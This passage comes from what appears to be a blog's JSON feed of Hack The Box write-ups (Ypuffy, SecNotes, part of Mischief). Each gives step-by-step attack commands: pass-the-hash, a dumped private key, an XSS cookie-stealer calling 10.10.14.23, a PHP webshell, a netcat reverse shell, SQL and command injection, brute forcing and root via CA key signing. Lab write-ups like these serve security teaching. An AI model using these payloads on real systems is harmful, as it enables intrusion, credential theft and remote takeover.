we can pass the hash to the Samba server and list the shares:root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' -d hackthebox.htb -H 10.10.10.107[+] Finding open SMB ports....[+] Hash detected, using pass-the-hash to authentiate[+] User session establishd on 10.10.10.107...[+] IP: 10.10.10.107:445\tName: 10.10.10.107                                      \tDisk                                                  \tPermissions\t----                                                  \t-----------\talice                                             \tREAD, WRITE\tIPC$                                              \tNO ACCESSCool, we can access the alice share. Next I listed all the files in the share:root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' -s alice -R -H 10.10.10.107[+] Finding open SMB ports....[+] Hash detected, using pass-the-hash to authentiate[+] User session establishd on 10.10.10.107...[+] IP: 10.10.10.107:445\tName: 10.10.10.107                                      \tDisk                                                  \tPermissions\t----                                                  \t-----------\talice                                             \tREAD, WRITE\t.\\\tdr--r--r--                0 Thu Feb  7 20:48:09 2019\t.\tdr--r--r--                0 Tue Jul 31 23:16:50 2018\t..\t-r--r--r--             1460 Mon Jul 16 21:38:51 2018\tmy_private_key.ppk\tIPC$                                              \tNO ACCESSThat SSH private key looks interesting, let’s download it and confirm this is really an SSH key:root@ragingunicorn:~# smbmap -u alice1978 -p '00000000000000000000000000000000:0B186E661BBDBDCF6047784DE8B9FD8B' --download alice/my_private_key.ppk -H 10.10.10.107[+] Finding open SMB ports....[+] Hash detected, using pass-the-hash to authentiate[+] User session establishd on 10.10.10.107...[+] Starting download: alice\\my_private_key.ppk (1460 bytes)[+] File output to: /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppkroot@ragingunicorn:~# file /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk/usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk: ASCII text, with CRLF line terminatorsroot@ragingunicorn:~# cat /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppkPuTTY-User-Key-File-2: ssh-rsaEncryption: noneComment: rsa-key-20180716Public-Lines: 6AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw==Private-Lines: 14AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwFVGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSEcOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsmahRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1qGs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPhhKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAAAIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5cQLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+WuvlxTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9To convert it to the OpenSSH format, I used the puttygen utility:root@ragingunicorn:~# puttygen /usr/share/smbmap/10.10.10.107-alice_my_private_key.ppk -O private-openssh -o alice_rsaroot@ragingunicorn:~# file alice_rsaalice_rsa: PEM RSA private keyWe can log in and get the user flag at this point:root@ragingunicorn:~# ssh -i alice_rsa alice1978@10.10.10.107The authenticity of host '10.10.10.107 (10.10.10.107)' can't be established.ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added '10.10.10.107' (ECDSA) to the list of known hosts.OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code.  With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.ypuffy$ cat user.txtacbc06&lt;redacted&gt;Priv escThe home directory contains an interesting user userca:ypuffy$ ls -latotal 20drwxr-xr-x   5 root       wheel      512 Jul 30  2018 .drwxr-xr-x  13 root       wheel      512 Feb  5 00:30 ..drwxr-x---   3 alice1978  alice1978  512 Jul 31  2018 alice1978drwxr-xr-x   3 bob8791    bob8791    512 Jul 30  2018 bob8791drwxr-xr-x   3 userca     userca     512 Jul 30  2018 usercaBob8791’s home directory contains an SQL file with a reference to a principal and keys tables:ypuffy$ pwd/home/bob8791/dbaypuffy$ lssshauth.sqlypuffy$ cat sshauth.sql                                                                                                                                                                                           CREATE TABLE principals (        uid text,        client cidr,        principal text,        PRIMARY KEY (uid,client,principal));CREATE TABLE keys (        uid text,        key text,        PRIMARY KEY (uid,key));grant select on principals,keys to appsrv;The userca directory contains the CA private and public keys:ypuffy$ ls -la-r--------  1 userca  userca  1679 Jul 30  2018 ca-r--r--r--  1 userca  userca   410 Jul 30  2018 ca.pubypuffy$ file ca.pubca.pub: OpenSSH RSA public keyThe httpd.conf file contains some directories that I didn’t enumerate at the beginning of the box:ypuffy$ cat httpd.conf                                                                                                                                                                                            server \"ypuffy.hackthebox.htb\" {        listen on * port 80        location \"/userca*\" {                root \"/userca\"                root strip 1                directory auto index        }        location \"/sshauth*\" {                fastcgi socket \"/run/wsgi/sshauthd.socket\"        }        location * {                block drop        }}The /etc/ssh/sshd_config file has been modified by the box creator and contains a few interesting lines:AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&amp;username=%uAuthorizedKeysCommandUser nobodyTrustedUserCAKeys /home/userca/ca.pubAuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&amp;username=%uAuthorizedPrincipalsCommandUser nobodyHere’s the summary of the what we found: SSH has been configured on this box to look up the public key of the connecting users by interrogating some kind of web application running on the box. The AuthorizedKeysCommand is useful when you don’t want to have to upload public keys on a whole bunch of server. You can centralize the keys in a database somewhere so it’s much easier to manage. The database dump we saw earlier in bob’s directory confirms this. The second AuthorizedPrincipalsCommand configuration is used to look up allowed principals in the database. The principal is added when the keys are signed by the CA.We can read the public SSH keys by sending requests to the application. The GET parameters are the same as what was in the database file:ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=alice1978\"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=bob8791\"   ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=userca\"  ypuffy$ curl \"http://127.0.0.1/sshauth?type=keys&amp;username=root\"   We can only get the public key for user alice1978Next, we can list the principal names using:ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=alice1978\"alice1978ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=bob8791\"   bob8791ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=userca\"  ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=appsrv\" ypuffy$ curl \"http://127.0.0.1/sshauth?type=principals&amp;username=root\"   3m3rgencyB4ckd00rInteresting, there’s a principal name for root called 3m3rgencyB4ckd00r. If we could have the CA sign an SSH key with this principal name, we should be able to log in as root on the box.OpenBSD has a sudo equivalent called doas:ypuffy$ cat /etc/doas.conf                                                                                                                                                              permit keepenv :wheelpermit nopass alice1978 as userca cmd /usr/bin/ssh-keygenIt seems we can run ssh-keygen as user userca without entering a password.ypuffy$ ssh-keygen -t ecdsa Generating public/private ecdsa key pair.Enter file in which to save the key (/home/alice1978/.ssh/id_ecdsa): /tmp/id_ecdsaEnter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /tmp/id_ecdsa.Your public key has been saved in /tmp/id_ecdsa.pub.The key fingerprint is:SHA256:kbrMU2l1XcB9DEIKw58lsyYFz03VMLDuEPgQrXQWW3c alice1978@ypuffy.hackthebox.htbThe key's randomart image is:+---[ECDSA 256]---+|       .=o.o*+BBE||        oOB*.=.+=||       .=*B*+ . .||       .o*=+     ||      . Soo .    ||     o +   o     ||      =     .    ||       .         ||                 |+----[SHA256]-----+We can generate a new DSA keypair for Alice and get it sign by the CA, making sure to assign the root’s principal name 3m3rgencyB4ckd00r”Here’s the breakdown of the ssh-keygen parameters used:  -s : this is the private key that will be used to sign the keys  -I : that’s the certificate identity  -n : the principals associated with the key (we need to include 3m3rgencyB4ckd00r)  -V : validity of the key  -z : serial number  id_ecdsa.pub : The public key we previously generatedypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I snowscan -n root,3m3rgencyB4ckd00r -V +1w -z 1 id_ecdsa.pubSigned user key id_ecdsa-cert.pub: id \"snowscan\" serial 1 for root,3m3rgencyB4ckd00r valid from 2018-09-15T20:07:00 to 2018-09-22T20:08:02ypuffy$ mkdir /home/alice1978/.sshypuffy$ cp id_ecdsa* /home/alice1978/.ssh ypuffy$ ssh root@localhostThe authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:oYYpshmLOvkyebJUObgH6bxJkOGRu7xsw3r7ta0LCzE.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added 'localhost' (ECDSA) to the list of known hosts.OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018Welcome to OpenBSD: The proactively secure Unix-like operating system.Please use the sendbug(1) utility to report bugs in the system.Before reporting a bug, please try to reproduce it with the latestversion of the code.  With bug reports, please try to ensure thatenough information to reproduce the problem is enclosed, and if aknown fix for it exists, include that as well.ypuffy# cat root.txt                                                                                                                                                                    1265f8&lt;redacted&gt;"
  },
  
  {
    "title": "Secnotes - Hack The Box",
    "url": "/posts/htb-writeup-secnotes/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, windows, sqli, wsl, csrf",
    "date": "2019-01-19 00:00:00 +0800",
    





    
    "snippet": "This blog post is a writeup of the Hack the Box SecNotes machine from 0xdf.Windows / 10.10.10.97Summary  The box runs a PHP application on an IIS server.  There is a 2nd order SQL injection in the ...",
    "content": "This blog post is a writeup of the Hack the Box SecNotes machine from 0xdf.Windows / 10.10.10.97Summary  The box runs a PHP application on an IIS server.  There is a 2nd order SQL injection in the registration page which allows us to dump all the notes from the database. There is also a CSRF that we can leverage to reset the application password by sending a malicous link to a user through the Contact Us form.  One of the note contains the credentials for user Tyler.  Using the Tyler credentials, we can read/write files from the new-site share, which lets us upload a PHP webshell to the IIS site running on port 8808.  We can then get a shell by either uploading and running nc.exe or using a nishang poweshell oneliner, gaining an initial shell as user Tyler on the system. I had trouble getting output from bash using nishang so I eventually had to use netcat instead of nishang.  Enumerating the box, we find that the Linux Subsystem is installed.  After launching bash, we find in .bash_history the credentials for the Administrator user.Detailed stepsNmap scanOnly 3 ports are open, this should make the initial enumeration a bit easier.  IIS port 80  IIS port 8808  SMB port 445root@darkisland:~# nmap -sC -sV -p- 10.10.10.97Starting Nmap 7.70 ( https://nmap.org ) at 2018-08-25 15:10 EDTNmap scan report for 10.10.10.97Host is up (0.015s latency).Not shown: 65532 filtered portsPORT     STATE SERVICE      VERSION80/tcp   open  http         Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0| http-title: Secure Notes - Login|_Requested resource was login.php445/tcp  open  microsoft-ds Windows 10 Enterprise 17134 microsoft-ds (workgroup: HTB)8808/tcp open  http         Microsoft IIS httpd 10.0| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: IIS WindowsService Info: Host: SECNOTES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h15m41s, deviation: 4h02m31s, median: -4m19s| smb-os-discovery: |   OS: Windows 10 Enterprise 17134 (Windows 10 Enterprise 6.3)|   OS CPE: cpe:/o:microsoft:windows_10::-|   Computer name: SECNOTES|   NetBIOS computer name: SECNOTES\\x00|   Workgroup: HTB\\x00|_  System time: 2018-08-25T12:12:28-07:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   2.02: |_    Message signing enabled but not required| smb2-time: |   date: 2018-08-25 15:12:26|_  start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 394.23 secondsWeb enumeration  Port 80 runs a custom SecNotes application  Port 8808 doesn’t have anything on it, except the default IIS page (tried enumerating with gobuster and didn’t find anything)Finding #1: We can enumerate user accountsThe box tells us whether or not a username exists when we attempt to log in.I tried fuzzing different usernames with wfuzz but only found the Tyler username which we already know from the SecNotes application page:wfuzz -z file,names.txt -d \"username=FUZZ&amp;password=1\" --hs \"No account found with that username\" http://10.10.10.97/login.phpFinding #2: Reflected XSS on the main login pageThe HTML page returns the username when authentication fails and the input is not properly sanitized so we can trigger an XXSExample payload in the username field: \"&gt;&lt;script&gt;alert(1);&lt;/script&gt;But we won’t be able to do anything useful with this since only our own user sees the error.Finding #3: Stored XSS in the notes applicationsThe notes application doesn’t escape any of the input data so we can embed javascript in the notes and attempt to steal cookies. Unfortunately there is no other user connecting and checking the notes so this is not useful for us here (we can’t steal session cookies of a logged on user).Payload: &lt;script&gt;document.write('&lt;img src=\"http://10.10.14.23:80/collect.gif?cookie=' + document.cookie + '\" /&gt;')&lt;/script&gt;Finding #4: 2nd order SQL injection on the registration pageThere’s an SQL injection vulnerability on the home.php page that we can abuse by creating a user with the following name: test' or 1=1-- -Once we log in after, the notes page will display all the notes from all users. The resulting query probably ends up being something like SELECT * FROM notes WHERE user = 'test' OR 1=1 so that basically returns all the notes because of the TRUE condition.One of the notes contains the credentials for the Tyler user.Finding #5: We can have Tyler change his password by sending him a linkThe Change Password page works through a POST request but it also works if we use a GET request instead.We can send messages to Tyler through the Contact Us form and he’ll click on every link that we send him. Because there is no anti-CSRF token on the Change Password page, we can trick Tyler in changing his password.Initially, I tried sending an HTML link such as:&lt;a href=\"http://10.10.10.97/change_pass.php?password=test11&amp;confirm_password=test11&amp;submit=submit\"&gt;Click this!&lt;/a&gt; but it didn’t work.However plaintext works: http://10.10.10.97/change_pass.php?password=test11&amp;confirm_password=test11&amp;submit=submit.So we send this to Tyler and we can log in after with the password we specified in the link.User shellThe credentials for Tyler are in one of the notes:\\\\secnotes.htb\\new-sitetyler / 92g!mA8BGjOirkL%OG*&amp;Let’s verify which shares he has access to:root@darkisland:~/tmp# smbclient -U tyler -L //10.10.10.97WARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\tyler's password: \tSharename       Type      Comment\t---------       ----      -------\tADMIN$          Disk      Remote Admin\tC$              Disk      Default share\tIPC$            IPC       Remote IPC\tnew-site        Disk      root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-siteWARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\tyler's password: Try \"help\" to get a list of possible commands.smb: \\&gt; ls  .                                   D        0  Sun Aug 19 14:06:14 2018  ..                                  D        0  Sun Aug 19 14:06:14 2018  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018\t\t12978687 blocks of size 4096. 7919013 blocks availableSo the new-site share is the root directory of the webserver listening on port 8808.To get a shell on the box we’ll do the following:  Upload a PHP webshell  Upload netcat  Run netcat through the webshellAlternatively we could run nishang to get a reverse shell, but I had problem running bash and getting the output so netcat it is.Webshell:&lt;HTML&gt;&lt;BODY&gt;&lt;FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"&gt;&lt;INPUT TYPE=\"text\" NAME=\"cmd\"&gt;&lt;INPUT TYPE=\"submit\" VALUE=\"Send\"&gt;&lt;/FORM&gt;&lt;pre&gt;&lt;?phpif($_GET['cmd']) {  system($_GET['cmd']);  }?&gt;&lt;/pre&gt;&lt;/BODY&gt;&lt;/HTML&gt;root@darkisland:~/tmp# smbclient -U tyler //10.10.10.97/new-siteWARNING: The \"syslog\" option is deprecatedEnter WORKGROUP\\tyler's password: Try \"help\" to get a list of possible commands.smb: \\&gt; pwdCurrent directory is \\\\10.10.10.97\\new-site\\smb: \\&gt; ls  .                                   D        0  Sun Aug 19 14:06:14 2018  ..                                  D        0  Sun Aug 19 14:06:14 2018  iisstart.htm                        A      696  Thu Jun 21 11:26:03 2018  iisstart.png                        A    98757  Thu Jun 21 11:26:03 2018\t\t12978687 blocks of size 4096. 7919013 blocks availablesmb: \\&gt; put snowscan.phpputting file snowscan.php as \\snowscan.php (1.6 kb/s) (average 1.6 kb/s)smb: \\&gt; put nc.exeputting file nc.exe as \\nc.exe (152.5 kb/s) (average 91.8 kb/s)Trigger the netcat connection with: http://secnotes.htb:8808/snowscan.php?cmd=nc+-e+cmd.exe+10.10.14.23+4444root@darkisland:~/tmp# nc -lvnp 4444listening on [any] 4444 ...connect to [10.10.14.23] from (UNKNOWN) [10.10.10.97] 49757Microsoft Windows [Version 10.0.17134.228](c) 2018 Microsoft Corporation. All rights reserved.C:\\inetpub\\new-site&gt;whoamiwhoamisecnotes\\tylerC:\\inetpub\\new-site&gt;type c:\\users\\tyler\\desktop\\user.txttype c:\\users\\tyler\\desktop\\user.txt6fa755&lt;redacted&gt;PrivescAfter looking around the box for a bit, I found that the Linux subsystem is installed. I noticed a Distros directory, Ubuntu then found bash.exe in C:\\Windows\\System32.C:\\&gt;dir06/21/2018  03:07 PM    &lt;DIR&gt;          Distros[...]C:\\Distros\\Ubuntu&gt; Volume in drive C has no label. Volume Serial Number is 9CDD-BADA Directory of C:\\Distros\\Ubuntu06/21/2018  05:59 PM    &lt;DIR&gt;          .06/21/2018  05:59 PM    &lt;DIR&gt;          ..07/11/2017  06:10 PM           190,434 AppxBlockMap.xml07/11/2017  06:10 PM             2,475 AppxManifest.xml06/21/2018  03:07 PM    &lt;DIR&gt;          AppxMetadata07/11/2017  06:11 PM            10,554 AppxSignature.p7x06/21/2018  03:07 PM    &lt;DIR&gt;          Assets06/21/2018  03:07 PM    &lt;DIR&gt;          images07/11/2017  06:10 PM       201,254,783 install.tar.gz07/11/2017  06:10 PM             4,840 resources.pri06/21/2018  05:51 PM    &lt;DIR&gt;          temp07/11/2017  06:10 PM           222,208 ubuntu.exe07/11/2017  06:10 PM               809 [Content_Types].xml               7 File(s)    201,686,103 bytes               6 Dir(s)  32,431,472,640 bytes freeC:\\Windows\\System32&gt;dir bash.exe06/21/2018  02:02 PM           115,712 bash.exeAfter starting bash and looking around the system, we find the Administrator credentials in root’s .bash_history file:C:\\Windows\\System32&gt;bashmesg: ttyname failed: Inappropriate ioctl for devicepython -c 'import pty;pty.spawn(\"/bin/bash\")'root@SECNOTES:~# cat .bash_historycat .bash_historycd /mnt/c/lscd Users/cd /cd ~lspwdmkdir filesystemmount //127.0.0.1/c$ filesystem/sudo apt install cifs-utilsmount //127.0.0.1/c$ filesystem/mount //127.0.0.1/c$ filesystem/ -o user=administratorcat /proc/filesystemssudo modprobe cifssmbclientapt install smbclientsmbclientsmbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh' \\\\\\\\127.0.0.1\\\\c$&gt; .bash_history less .bash_historyWe can then psexec as administrator and get the root flag:root@darkstar:~# /usr/share/doc/python-impacket/examples/psexec.py 'administrator:u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97 cmd.exeImpacket v0.9.17 - Copyright 2002-2018 Core Security Technologies[*] Requesting shares on 10.10.10.97.....[*] Found writable share ADMIN$[*] Uploading file DmaHNXRy.exe[*] Opening SVCManager on 10.10.10.97.....[*] Creating service twnE on 10.10.10.97.....[*] Starting service twnE.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.17134.228](c) 2018 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32&gt;type c:\\users\\administrator\\desktop\\root.txt7250cd&lt;redacted&gt;"
  },
  
  {
    "title": "Mischief - Hack The Box",
    "url": "/posts/htb-writeup-mischief/",
    "categories": "hackthebox, infosec",
    "tags": "hackthebox, linux, lxc, containers, unintended",
    "date": "2019-01-05 00:00:00 +0800",
    





    
    "snippet": "This blog post is a writeup of the Mischief machine from Hack the Box using the unintended LXC container privesc method.Linux / 10.10.10.92Summary  SNMP is enabled and the default public SNMP commu...",
    "content": "This blog post is a writeup of the Mischief machine from Hack the Box using the unintended LXC container privesc method.Linux / 10.10.10.92Summary  SNMP is enabled and the default public SNMP community string is configured  Using SNMP, we find that a Python SimpleHTTPServer is running with basic authentication, the credentials are passed as command arguments so we can see those in the snmpwalk  The webserver is running on port 3366 and we can log in with the credentials we found  There is another set of credentials displayed on the webpage but we don’t know what these are for yet  Using SNMP, we find there is an IPv6 address configured on the server and nmap shows an Apache server running on port 80  We can log in to the webserver with the password we found on the other page, we just have to guess/bruteforce the username which is administrator  There’s a command injection vulnerability on the PHP page that we can exploit to read a credentials file in the loki home directory  We can log in with SSH as user loki now and we see that we are part of the lxd group  We can priv esc by uploading a container, setting it as privileged and mounting the local filesystem within the container  The root.txt flag in /root is a fake one, but doing a find command on the entire filesystem reveals it’s real locationTools/Blogs used  http://docwiki.cisco.com/wiki/How_to_get_IPv6_address_via_SNMP  https://dominicbreuker.com/post/htb_calamity/Detailed stepsNmapThere’s only a webserver and the SSH service running on this boxroot@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sC -sV -p- 10.10.10.92Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 18:57 EDTNmap scan report for 10.10.10.92Host is up (0.015s latency).Not shown: 65533 filtered portsPORT     STATE SERVICE VERSION22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)| http-auth: | HTTP/1.0 401 Unauthorized\\x0D|_  Basic realm=Test|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1|_http-title: Site doesn't have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 127.89 secondsSNMP reconSNMP is open on UDP port 161root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sU -F 10.10.10.92Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:07 EDTNmap scan report for 10.10.10.92Host is up (0.014s latency).Not shown: 99 open|filtered portsPORT    STATE SERVICE161/udp open  snmpNmap done: 1 IP address (1 host up) scanned in 3.03 secondsSNMP is using the default public community string:root@violentunicorn:~/hackthebox/Machines/Mischief# onesixtyone 10.10.10.92Scanning 1 hosts, 2 communities10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64We can get the list of processes with this nmap script, or by doing an snmpwalk:root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -sU -p 161 --script=snmp-processes 10.10.10.92Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:15 EDTNmap scan report for 10.10.10.92Host is up (0.014s latency).PORT    STATE SERVICE161/udp open  snmp| snmp-processes:[...]|   631: |     Name: python|     Path: python|     Params: -m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/[...]We found some credentials in there: loki / godofmischiefislokiCredentials found on the webserverWe can now log in to the webserver with the found credentials:On the page we see an image of Loki and two sets of credentials:  loki / godofmischiefisloki  loki / trickeryanddeceitWe already have the first one, we need to find where to use the 2nd one.The trickeryanddeceit password doesn’t work on SSH (tried bruteforcing usernames also)SNMP recon (part 2)When we do a full snmpwalk, we pickup IPv6 addresses configured on the interface:root@violentunicorn:~/hackthebox/Machines/Mischief# snmpwalk -v2c -c public 10.10.10.92 1.3.6.1.2.1.4.34.1.3iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.92 = INTEGER: 2iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.178.24.116 = INTEGER: 2iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.178.24.116 = INTEGER: 2We convert that to hex using a python script:&gt;&gt;&gt; s = \"222.173.190.239.0.0.0.0.2.80.86.255.254.178.24.116\"&gt;&gt;&gt; s = s.split(\".\")&gt;&gt;&gt; ip = \"\"&gt;&gt;&gt; for i in s:...     ip += hex(int(i))[2:].rjust(2,'0')... &gt;&gt;&gt; print ipdeadbeef00000000025056fffeb21874IPv6 address: dead:beef:0000:0000:0250:56ff:feb2:1874We’ll add this IPv6 address to our /etc/hosts.Nmap IPv6There is another webserver running on port 80 but only listening on IPv6 addresses:root@violentunicorn:~/hackthebox/Machines/Mischief# nmap -6 -sC -sV -p- dead:beef:0000:0000:0250:56ff:feb2:1874Starting Nmap 7.70 ( https://nmap.org ) at 2018-07-08 19:29 EDTNmap scan report for dead:beef::250:56ff:feb2:1874Host is up (0.015s latency).Not shown: 65533 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 400 Bad RequestService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelHost script results:| address-info: |   IPv6 EUI-64: |     MAC address: |       address: 00:50:56:b2:18:74|_      manuf: VMwareService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.58 secondsCommand execution panelThe web server is running a PHP application:It’s probably using the 2nd password we found but we don’t know the username (loki doesn’t work here.)We’ll use Hydra to bruteforce the username:root@violentunicorn:~/hackthebox/Machines/Mischief# hydra -I -L /root/SecLists/Usernames/top_shortlist.txt -p trickeryanddeceit mischief http-post-form \"/login.php:user=^USER^&amp;password=^PASS^:credentials do not match\"Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (http://www.thc.org/thc-hydra) starting at 2018-07-08 19:37:12[DATA] max 11 tasks per 1 server, overall 11 tasks, 11 login tries (l:11/p:1), ~1 try per task[DATA] attacking http-post-form://mischief:80//login.php:user=^USER^&amp;password=^PASS^:credentials do not match[80][http-post-form] host: mischief   login: administrator   password: trickeryanddeceit1 of 1 target successfully completed, 1 valid password foundHydra (http://www.thc.org/thc-hydra) finished at 2018-07-08 19:37:13Username is: administratorOnce logged in we see:There’s a hint about a credentials file in the home directory.The command input is filtered (some commands are blacklisted.)But we can get the credentials with: ping -c 2 127.0.0.1; cat /home/loki/c*;Password is lokiisthebestnorsegodWe can now SSH with user loki and password 